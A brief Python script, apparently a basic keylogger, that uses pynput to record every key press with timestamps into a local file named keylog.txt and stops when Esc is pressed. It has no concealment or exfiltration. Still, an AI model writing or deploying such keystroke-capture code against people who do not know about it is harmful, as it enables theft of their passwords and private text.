import logging
from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    try:
        logging.info(str(key))
    except AttributeError:
        # If special key is pressed (e.g., Shift), ignore it
        pass

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Set up logging
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

# Start listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()